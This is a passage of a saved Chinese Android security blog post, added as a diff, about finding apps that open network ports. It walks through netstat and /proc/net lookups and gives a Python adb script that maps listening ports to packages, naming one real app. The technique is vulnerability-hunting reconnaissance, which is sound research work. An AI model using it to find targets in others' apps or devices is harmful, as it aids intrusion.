@@ -1,0 +1,746 @@
+<!DOCTYPE html><!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="zh-CN"> <![endif]--><!--[if IE 7]> <html class="no-js lt-ie9 lt-ie8" lang="zh-CN"> <![endif]--><!--[if IE 8]> <html class="no-js lt-ie9" lang="zh-CN"> <![endif]--><!--[if gt IE 8]><!-->
+<!-- saved from url=(0148)http://www.droidsec.cn/%e6%b5%85%e8%b0%88android%e5%bc%80%e6%94%be%e7%bd%91%e7%bb%9c%e7%ab%af%e5%8f%a3%e7%9a%84%e5%ae%89%e5%85%a8%e9%a3%8e%e9%99%a9/ -->
+<html class="no-js" lang="zh-CN"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Android Security 安卓安全中文站 | 移动安全技术与资讯分享 | 安卓应用漏洞挖掘 | 安卓漏洞攻防">
+<meta name="author" content="K | Uazoh.com">
+<title>浅谈Android开放网络端口的安全风险  |  DroidSec.cn</title>
+<link rel="icon" type="image/png" href="http://www.droidsec.cn/wp-content/uploads/2015/03/1112.png"><link rel="alternate" type="application/rss+xml" title="DroidSec.cn » 浅谈Android开放网络端口的安全风险评论Feed" href="http://www.droidsec.cn/%e6%b5%85%e8%b0%88android%e5%bc%80%e6%94%be%e7%bd%91%e7%bb%9c%e7%ab%af%e5%8f%a3%e7%9a%84%e5%ae%89%e5%85%a8%e9%a3%8e%e9%99%a9/feed/">
+		
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel="stylesheet" id="crayon-css" href="浅谈Android开放网络端口的安全风险 _ DroidSec.cn_files/crayon.min.css" type="text/css" media="all">
+<link rel="stylesheet" id="crayon-theme-github-css" href="浅谈Android开放网络端口的安全风险 _ DroidSec.cn_files/github.css" type="text/css" media="all">
+<link rel="stylesheet" id="crayon-font-monaco-css" href="浅谈Android开放网络端口的安全风险 _ DroidSec.cn_files/monaco.css" type="text/css" media="all">
+<link rel="stylesheet" id="uazoh-bootstrap-css" href="浅谈Android开放网络端口的安全风险 _ DroidSec.cn_files/bootstrap.min.css" type="text/css" media="all">
+<link rel="stylesheet" id="uazoh-animate-css" href="浅谈Android开放网络端口的安全风险 _ DroidSec.cn_files/animate.css" type="text/css" media="all">
+<link rel="stylesheet" id="uazoh-mCustomScrollbar-css" href="浅谈Android开放网络端口的安全风险 _ DroidSec.cn_files/jquery.mCustomScrollbar.css" type="text/css" media="all">
+<link rel="stylesheet" id="uazoh-font-awesome-css" href="浅谈Android开放网络端口的安全风险 _ DroidSec.cn_files/font-awesome.min.css" type="text/css" media="all">
+<link rel="stylesheet" id="uazoh-main-css" href="浅谈Android开放网络端口的安全风险 _ DroidSec.cn_files/main.css" type="text/css" media="all">
+<link rel="stylesheet" id="uazoh-h1-css" href="浅谈Android开放网络端口的安全风险 _ DroidSec.cn_files/h1.css" type="text/css" media="all">
+<link rel="stylesheet" id="uazoh-responsive-css" href="浅谈Android开放网络端口的安全风险 _ DroidSec.cn_files/responsive.css" type="text/css" media="all">
+<link rel="stylesheet" id="uazoh-color-scheme-css" href="浅谈Android开放网络端口的安全风险 _ DroidSec.cn_files/color.css" type="text/css" media="all">
+<link rel="stylesheet" id="uazoh-default-style-css" href="浅谈Android开放网络端口的安全风险 _ DroidSec.cn_files/style.css" type="text/css" media="all">
+<link rel="stylesheet" id="uazoh-LayerSlider-css" href="浅谈Android开放网络端口的安全风险 _ DroidSec.cn_files/layerslider.css" type="text/css" media="all">
+
+
+
+
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.droidsec.cn/xmlrpc.php?rsd">
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.droidsec.cn/wp-includes/wlwmanifest.xml"> 
+<link rel="prev" title="人手一份核武器 – Hacking Team 泄露（开源）资料导览手册" href="http://www.droidsec.cn/%e4%ba%ba%e6%89%8b%e4%b8%80%e4%bb%bd%e6%a0%b8%e6%ad%a6%e5%99%a8-hacking-team-%e6%b3%84%e9%9c%b2%ef%bc%88%e5%bc%80%e6%ba%90%ef%bc%89%e8%b5%84%e6%96%99%e5%af%bc%e8%a7%88%e6%89%8b%e5%86%8c/">
+<link rel="next" title="Android安全新书推荐——《Android恶意代码分析与渗透测试》" href="http://www.droidsec.cn/android%e5%ae%89%e5%85%a8%e6%96%b0%e4%b9%a6%e6%8e%a8%e8%8d%90-%e3%80%8aandroid%e6%81%b6%e6%84%8f%e4%bb%a3%e7%a0%81%e5%88%86%e6%9e%90%e4%b8%8e%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/">
+<meta name="generator" content="WordPress 4.2.2">
+<link rel="canonical" href="浅谈Android开放网络端口的安全风险 _ DroidSec.cn_files/浅谈Android开放网络端口的安全风险 _ DroidSec.cn.html">
+<link rel="shortlink" href="http://www.droidsec.cn/?p=335">
+<style type="text/css" media="screen">#wp-admin-bar-user-info .avatar-64 {width:64px}</style>
+<style></style><style type="text/css"></style></head>
+<body class="single single-post postid-335 single-format-standard">
+<!--专版参数-->
+<div id="to-the-top" title="返回顶端" style="display: block;"><i class="fa fa-chevron-up"></i></div>
+<!--移动菜单-->
+<i class="fa fa-align-justify" id="uazoh7-mobile-menu-btn"></i>
+<div class="uazoh7-mobile-menu" id="uazoh7-mobile-menu"> <h3>菜单</h3>
+<nav class="menu-%e8%8f%9c%e5%8d%951-container mCustomScrollbar _mCS_1" style="max-height: 871px; overflow: hidden;"><div class="mCustomScrollBox mCS-light" id="mCSB_1" style="position: relative; height: 100%; overflow: hidden; max-width: 100%; max-height: 871px;"><div class="mCSB_container mCS_no_scrollbar" style="position:relative; top:0;"><ul id="mobile_nav" class="mobile-menu"><li><a href="http://www.droidsec.cn/">首页</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/android-security-basic/">Android安全基础</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/app%e5%ae%89%e5%85%a8%e6%b5%8b%e8%af%95%e5%85%a5%e9%97%a8/">APP安全测试入门</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/%e9%87%91%e5%88%9a%e5%ae%a1%e8%ae%a1%e7%b3%bb%e7%bb%9f/">金刚审计系统</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/%e5%85%b3%e4%ba%8e%e6%9c%ac%e7%ab%99/">关于DroidSec</a><span class="border"></span></li>
+<li><a href="http://weibo.com/androidsec">关注本站微博</a><span class="border"></span></li>
+</ul></div><div class="mCSB_scrollTools" style="position: absolute; display: none;"><div class="mCSB_draggerContainer"><div class="mCSB_dragger" style="position: absolute; top: 0px;" oncontextmenu="return false;"><div class="mCSB_dragger_bar" style="position:relative;"></div></div><div class="mCSB_draggerRail"></div></div></div></div><span class="border"></span></nav></div>
+    <header class="uazoh7-header uazoh7-header-1">
+
+      <div class="uazoh7-top-bar">
+        <div class="container">
+          <div class="row">
+            <div class="col-lg-12">
+              
+              <ul class="social-btns">
+								<li><a href="http://www.droidsec.cn/feed" title="rss" class="rss regular" target="_blank"><i class="fa fa-rss"></i></a><a href="http://www.droidsec.cn/feed" title="rss" class="rss hover" target="_blank"><i class="fa fa-rss"></i></a></li><li><a href="http://weibo.com/androidsec" title="weibo" class="weibo regular" target="_blank"><i class="fa fa-weibo"></i></a><a href="http://weibo.com/androidsec" title="weibo" class="weibo hover" target="_blank"><i class="fa fa-weibo"></i></a></li><li><a href="http://droidsec/#QQ.com" title="envelope" class="envelope regular" target="_blank"><i class="fa fa-envelope"></i></a><a href="http://droidsec/#QQ.com" title="envelope" class="envelope hover" target="_blank"><i class="fa fa-envelope"></i></a></li>              </ul>
+            </div>
+          </div>
+        </div>
+      </div>	   <div class="uazoh7-header-bg uazoh7-header-sticked" id="uazoh7-header-menu">
+        <div class="container">
+          <div class="row">
+            <div class="col-lg-12">
+              <div class="uazoh7-relative">
+                <a href="http://www.droidsec.cn/" title="DroidSec.cn">
+                <div class="uazoh7-logo">                  <img src="浅谈Android开放网络端口的安全风险 _ DroidSec.cn_files/a1a.png" alt="DroidSec.cn">                  <p class="logo">DroidSec.cn</p>
+                  <p class="tagline">安卓安全中文站</p>
+                </div>
+                </a>
+				<nav class="menu-%e8%8f%9c%e5%8d%951-container"><ul id="main_nav" class="main-menu"><li><a href="http://www.droidsec.cn/">首页</a><span class="hover"></span></li>
+<li><a href="http://www.droidsec.cn/android-security-basic/">Android安全基础</a><span class="hover" style="display: none;"></span></li>
+<li><a href="http://www.droidsec.cn/app%e5%ae%89%e5%85%a8%e6%b5%8b%e8%af%95%e5%85%a5%e9%97%a8/">APP安全测试入门</a><span class="hover"></span></li>
+<li><a href="http://www.droidsec.cn/%e9%87%91%e5%88%9a%e5%ae%a1%e8%ae%a1%e7%b3%bb%e7%bb%9f/">金刚审计系统</a><span class="hover"></span></li>
+<li><a href="http://www.droidsec.cn/%e5%85%b3%e4%ba%8e%e6%9c%ac%e7%ab%99/">关于DroidSec</a><span class="hover"></span></li>
+<li><a href="http://weibo.com/androidsec">关注本站微博</a><span class="hover"></span></li>
+</ul></nav>              </div>
+            </div>
+          </div>
+        </div>
+      </div>    </header><div class="uazoh7-content" style="padding-top: 101px;"><section class="uazoh7-page-title-1" data-stellar-background-ratio="0.5">
+        <div class="container">
+          <div class="row">
+            <div class="col-lg-9 col-md-9 col-sm-9">
+			
+								<h1>文章</h1>
+				            </div>
+            <div class="col-lg-3 col-md-3 col-sm-3">
+              <form class="search" method="get" action="http://www.droidsec.cn/"><input type="text" placeholder="输入关键词后回车..." id="s" name="s" value=""><button type="submit" value="Search"><i class="fa fa-search"></i></button></form>            </div>
+          </div>
+        </div>
+      </section>
+      <section class="uazoh7-desktop-breadscrubs">
+        <div class="container">
+          <div class="row">
+            <div class="col-lg-12">
+              <div class="uazoh7-desktop-breadscrubs-inner">
+                 <a href="http://www.droidsec.cn/">Home</a> <i class="fa fa-angle-double-right"></i> <a href="http://www.droidsec.cn/category/app%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98/">APP漏洞挖掘</a> <i class="fa fa-angle-double-right"></i> 浅谈Android开放网络端口的安全风险              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section class="uazoh7-mobile-breadscrubs">
+        <div class="container">
+          <div class="row">
+            <div class="col-lg-12">
+               <a href="http://www.droidsec.cn/">Home</a> <i class="fa fa-angle-double-right"></i> <a href="http://www.droidsec.cn/category/app%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98/">APP漏洞挖掘</a> <i class="fa fa-angle-double-right"></i> 浅谈Android开放网络端口的安全风险            </div>
+          </div>
+        </div>
+      </section><section class="uazoh7-section">
+<div class="container">
+<div class="row" style="margin-top: 0px;">
+<div class="col-lg-9" id="main"><article id="post-335" class="uazoh7-post post-335 post type-post status-publish format-standard hentry category-app">
+<header>
+<h3 style="margin-top: 0px;"><i class="fa fa-pencil"></i><span> 浅谈Android开放网络端口的安全风险</span></h3>
+<p> <a href="http://www.droidsec.cn/category/app%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98/" rel="category tag">APP漏洞挖掘</a> by <a href="http://www.droidsec.cn/author/droidsec/" title="由droidsec发布" rel="author">droidsec</a></p>
+</header>
+
+<h1>0x00 简介</h1>
+<hr>
+<p>Android应用通常使用PF_UNIX、PF_INET、PF_NETLINK等不同domain的socket来进行本地IPC或者远程网络通信，这些暴露的socket代表了潜在的本地或远程攻击面，历史上也出现过不少利用socket进行拒绝服务、root提权或者远程命令执行的案例。特别是PF_INET类型的网络socket，可以通过网络与Android应用通信，其原本用于linux环境下开放网络服务，由于缺乏对网络调用者身份或者本地调用者pid、permission等细粒度的安全检查机制，在实现不当的情况下，可以突破Android的沙箱限制，以被攻击应用的权限执行命令，通常出现比较严重的漏洞。作为Android安全研究的新手，笔者带着传统服务器渗透寻找开放socket端口的思路，竟然也刷了不少漏洞，下面就对这种漏洞的发现、案例及影响进行归纳。</p>
+<h1>0x01 Android开放端口应用定位</h1>
+<hr>
+<p>简单地利用命令netstat就可以发现Android开放了许多socket端口，如图。但这些开放端口本后的应用却不得而知。</p>
+<p><img src="浅谈Android开放网络端口的安全风险 _ DroidSec.cn_files/2015070902353156806.png" alt="enter image description here"></p>
+<p>此时可以通过三步定位法进行寻找（感谢@瘦蛟舞的<a href="http://zone.wooyun.org/content/20410">帖子</a>），支持非root手机。</p>
+<p>第一步，利用netstat寻找感兴趣的开放socket端口，如图中的15555。</p>
+<p>第二步，将端口转换为十六进制值，查看位于/proc/net/目录下对应的socket套接字状态文件，在其中找到使用该socket的应用的uid。如15555的十六进制表示为1cc3，协议类型为tcp6，那么查看/proc/net/tcp6文件。</p>
+<p><img src="浅谈Android开放网络端口的安全风险 _ DroidSec.cn_files/2015070902353152015.png" alt="enter image description here"></p>
+<p>注意上面的10115，就是使用该socket的应用的uid。通过这个uid可以得知应用的用户名为u0_a115。</p>
+<p>第三步，根据用户名就可以找到应用了</p>
+<p><img src="浅谈Android开放网络端口的安全风险 _ DroidSec.cn_files/2015070902353142425.png" alt="enter image description here"></p>
+<p>至此，我们就知道开放15555端口的应用为com.qiyi.video，尽管我们还不能分辨出开放该端口的准确进程，但仍然为进一步的漏洞挖掘打下基础。</p>
+<p>写一个简单的脚本来自动化的完成此项工作.</p>
+<div>
+<div id="highlighter_391791" class="syntaxhighlighter  python">
+<table border="0" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td class="gutter">
+<div class="line number1 index0 alt2">1</div>
+<div class="line number2 index1 alt1">2</div>
+<div class="line number3 index2 alt2">3</div>
+<div class="line number4 index3 alt1">4</div>
+<div class="line number5 index4 alt2">5</div>
+<div class="line number6 index5 alt1">6</div>
+<div class="line number7 index6 alt2">7</div>
+<div class="line number8 index7 alt1">8</div>
+<div class="line number9 index8 alt2">9</div>
+<div class="line number10 index9 alt1">10</div>
+<div class="line number11 index10 alt2">11</div>
+<div class="line number12 index11 alt1">12</div>
+<div class="line number13 index12 alt2">13</div>
+<div class="line number14 index13 alt1">14</div>
+<div class="line number15 index14 alt2">15</div>
+<div class="line number16 index15 alt1">16</div>
+<div class="line number17 index16 alt2">17</div>
+<div class="line number18 index17 alt1">18</div>
+<div class="line number19 index18 alt2">19</div>
+<div class="line number20 index19 alt1">20</div>
+<div class="line number21 index20 alt2">21</div>
+<div class="line number22 index21 alt1">22</div>
+<div class="line number23 index22 alt2">23</div>
+<div class="line number24 index23 alt1">24</div>
+<div class="line number25 index24 alt2">25</div>
+<div class="line number26 index25 alt1">26</div>
+<div class="line number27 index26 alt2">27</div>
+<div class="line number28 index27 alt1">28</div>
+<div class="line number29 index28 alt2">29</div>
+<div class="line number30 index29 alt1">30</div>
+<div class="line number31 index30 alt2">31</div>
+<div class="line number32 index31 alt1">32</div>
+<div class="line number33 index32 alt2">33</div>
+<div class="line number34 index33 alt1">34</div>
+<div class="line number35 index34 alt2">35</div>
+<div class="line number36 index35 alt1">36</div>
+<div class="line number37 index36 alt2">37</div>
+<div class="line number38 index37 alt1">38</div>
+<div class="line number39 index38 alt2">39</div>
+<div class="line number40 index39 alt1">40</div>
+<div class="line number41 index40 alt2">41</div>
+<div class="line number42 index41 alt1">42</div>
+<div class="line number43 index42 alt2">43</div>
+<div class="line number44 index43 alt1">44</div>
+<div class="line number45 index44 alt2">45</div>
+<div class="line number46 index45 alt1">46</div>
+<div class="line number47 index46 alt2">47</div>
+<div class="line number48 index47 alt1">48</div>
+<div class="line number49 index48 alt2">49</div>
+<div class="line number50 index49 alt1">50</div>
+<div class="line number51 index50 alt2">51</div>
+<div class="line number52 index51 alt1">52</div>
+<div class="line number53 index52 alt2">53</div>
+<div class="line number54 index53 alt1">54</div>
+<div class="line number55 index54 alt2">55</div>
+<div class="line number56 index55 alt1">56</div>
+<div class="line number57 index56 alt2">57</div>
+<div class="line number58 index57 alt1">58</div>
+<div class="line number59 index58 alt2">59</div>
+<div class="line number60 index59 alt1">60</div>
+</td>
+<td class="code">
+<div class="container">
+<div class="line number1 index0 alt2"><code class="python keyword">import</code> <code class="python plain">subprocess,re </code></div>
+<div class="line number2 index1 alt1"></div>
+<div class="line number3 index2 alt2"><code class="python keyword">def</code> <code class="python plain">toHexPort(port):</code></div>
+<div class="line number4 index3 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">hexport </code><code class="python keyword">=</code> <code class="python functions">str</code><code class="python plain">(</code><code class="python functions">hex</code><code class="python plain">(</code><code class="python functions">int</code><code class="python plain">(port)))</code></div>
+<div class="line number5 index4 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code> <code class="python plain">hexport.strip(</code><code class="python string">'0x'</code><code class="python plain">).upper()</code></div>
+<div class="line number6 index5 alt1"></div>
+<div class="line number7 index6 alt2"><code class="python keyword">def</code> <code class="python plain">finduid(protocol, entry):</code></div>
+<div class="line number8 index7 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">(protocol</code><code class="python keyword">=</code><code class="python keyword">=</code><code class="python string">'tcp'</code> <code class="python keyword">or</code> <code class="python plain">protocol</code><code class="python keyword">=</code><code class="python keyword">=</code><code class="python string">'tcp6'</code><code class="python plain">):</code></div>
+<div class="line number9 index8 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">uid </code><code class="python keyword">=</code> <code class="python plain">entry.split()[</code><code class="python keyword">-</code><code class="python value">10</code><code class="python plain">]</code></div>
+<div class="line number10 index9 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">else</code><code class="python plain">: </code><code class="python comments"># udp or udp6</code></div>
+<div class="line number11 index10 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">uid </code><code class="python keyword">=</code> <code class="python plain">entry.split()[</code><code class="python keyword">-</code><code class="python value">6</code><code class="python plain">]</code></div>
+<div class="line number12 index11 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">uid </code><code class="python keyword">=</code> <code class="python functions">int</code><code class="python plain">(uid)</code></div>
+<div class="line number13 index12 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">(uid &gt; </code><code class="python value">10000</code><code class="python plain">): </code><code class="python comments"># just for non-system app</code></div>
+<div class="line number14 index13 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code> <code class="python string">'u0_a'</code><code class="python keyword">+</code><code class="python functions">str</code><code class="python plain">(uid</code><code class="python keyword">-</code><code class="python value">10000</code><code class="python plain">) </code></div>
+<div class="line number15 index14 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">else</code><code class="python plain">:</code></div>
+<div class="line number16 index15 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code> <code class="python keyword">-</code><code class="python value">1</code></div>
+<div class="line number17 index16 alt2"></div>
+<div class="line number18 index17 alt1"><code class="python keyword">def</code> <code class="python plain">main():</code></div>
+<div class="line number19 index18 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">netstat_cmd </code><code class="python keyword">=</code> <code class="python string">"adb shell netstat | grep -Ei 'listen|udp*'"</code></div>
+<div class="line number20 index19 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#netstat_cmd = "adb shell netstat "</code></div>
+<div class="line number21 index20 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">grep_cmd </code><code class="python keyword">=</code> <code class="python string">"adb shell grep"</code></div>
+<div class="line number22 index21 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">proc_net </code><code class="python keyword">=</code> <code class="python string">"/proc/net/"</code></div>
+<div class="line number23 index22 alt2"></div>
+<div class="line number24 index23 alt1"><code class="python comments"># step 1, find interesting port</code></div>
+<div class="line number25 index24 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">orig_output </code><code class="python keyword">=</code> <code class="python plain">subprocess.check_output(netstat_cmd, shell</code><code class="python keyword">=</code><code class="python color1">True</code><code class="python plain">)</code></div>
+<div class="line number26 index25 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">list_line </code><code class="python keyword">=</code> <code class="python plain">orig_output.split(</code><code class="python string">'\r\n'</code><code class="python plain">)</code></div>
+<div class="line number27 index26 alt2"></div>
+<div class="line number28 index27 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">apps </code><code class="python keyword">=</code> <code class="python plain">[]</code></div>
+<div class="line number29 index28 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">strip_listline </code><code class="python keyword">=</code> <code class="python plain">[]</code></div>
+<div class="line number30 index29 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">pattern </code><code class="python keyword">=</code> <code class="python plain">re.</code><code class="python functions">compile</code><code class="python plain">(</code><code class="python string">"^Proto"</code><code class="python plain">) </code><code class="python comments"># omit the first line</code></div>
+<div class="line number31 index30 alt2"></div>
+<div class="line number32 index31 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code> <code class="python plain">line </code><code class="python keyword">in</code> <code class="python plain">list_line:</code></div>
+<div class="line number33 index32 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">(line !</code><code class="python keyword">=</code> <code class="python plain">'') </code><code class="python keyword">and</code> <code class="python plain">(pattern.match(line)</code><code class="python keyword">=</code><code class="python keyword">=</code><code class="python color1">None</code><code class="python plain">):</code></div>
+<div class="line number34 index33 alt1"></div>
+<div class="line number35 index34 alt2"><code class="python comments"># step 2, find uid in /proc/net/[protocol] based on port </code></div>
+<div class="line number36 index35 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">socket_entry </code><code class="python keyword">=</code> <code class="python plain">line.split()</code></div>
+<div class="line number37 index36 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">protocol </code><code class="python keyword">=</code> <code class="python plain">socket_entry[</code><code class="python value">0</code><code class="python plain">]&nbsp; </code></div>
+<div class="line number38 index37 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">port </code><code class="python keyword">=</code> <code class="python plain">socket_entry[</code><code class="python value">3</code><code class="python plain">].split(</code><code class="python string">':'</code><code class="python plain">)[</code><code class="python keyword">-</code><code class="python value">1</code><code class="python plain">]</code></div>
+<div class="line number39 index38 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">grep_appid </code><code class="python keyword">=</code> <code class="python plain">grep_cmd</code><code class="python keyword">+</code><code class="python string">' '</code><code class="python keyword">+</code> <code class="python plain">toHexPort(port)</code><code class="python keyword">+</code><code class="python string">' '</code><code class="python keyword">+</code><code class="python plain">proc_net </code><code class="python keyword">+</code> <code class="python plain">protocol </code></div>
+<div class="line number40 index39 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">net_entry </code><code class="python keyword">=</code> <code class="python plain">subprocess.check_output(grep_appid, shell</code><code class="python keyword">=</code><code class="python color1">True</code><code class="python plain">)</code></div>
+<div class="line number41 index40 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">uid </code><code class="python keyword">=</code> <code class="python plain">finduid(protocol, net_entry)</code></div>
+<div class="line number42 index41 alt1"><code class="python comments"># step 3, find app username based on uid</code></div>
+<div class="line number43 index42 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">(uid </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python keyword">-</code><code class="python value">1</code><code class="python plain">): </code><code class="python keyword">continue</code></div>
+<div class="line number44 index43 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">applist </code><code class="python keyword">=</code> <code class="python plain">subprocess.check_output(</code><code class="python string">'adb shell ps | grep '</code><code class="python keyword">+</code><code class="python plain">uid, shell</code><code class="python keyword">=</code><code class="python color1">True</code><code class="python plain">).split()</code></div>
+<div class="line number45 index44 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">app </code><code class="python keyword">=</code> <code class="python plain">applist[</code><code class="python value">8</code><code class="python plain">]</code></div>
+<div class="line number46 index45 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">apps.append(app)</code></div>
+<div class="line number47 index46 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">strip_listline.append(line)</code></div>
+<div class="line number48 index47 alt1"></div>
+<div class="line number49 index48 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">itapp</code><code class="python keyword">=</code> <code class="python functions">iter</code><code class="python plain">(apps)</code></div>
+<div class="line number50 index49 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">itline</code><code class="python keyword">=</code><code class="python functions">iter</code><code class="python plain">(strip_listline)</code></div>
+<div class="line number51 index50 alt2"><code class="python comments"># last, add app in orig_output of sockets</code></div>
+<div class="line number52 index51 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">print</code> <code class="python plain">(</code><code class="python string">"Package&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Proto Recv-Q Send-Q&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Local Address&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Foreign Address&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; State\r\n"</code><code class="python plain">)</code></div>
+<div class="line number53 index52 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">try</code><code class="python plain">:</code></div>
+<div class="line number54 index53 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">while</code> <code class="python color1">True</code><code class="python plain">:</code></div>
+<div class="line number55 index54 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python plain">itapp.</code><code class="python functions">next</code><code class="python plain">()</code><code class="python keyword">+</code><code class="python string">' '</code><code class="python keyword">+</code><code class="python plain">itline.</code><code class="python functions">next</code><code class="python plain">()</code></div>
+<div class="line number56 index55 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">except</code> <code class="python plain">StopIteration:</code></div>
+<div class="line number57 index56 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">pass</code></div>
+<div class="line number58 index57 alt1"></div>
+<div class="line number59 index58 alt2"><code class="python keyword">if</code> <code class="python plain">__name__ </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">'__main__'</code><code class="python plain">:</code></div>
+<div class="line number60 index59 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">main()</code></div>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+<p>运行结果如下</p>
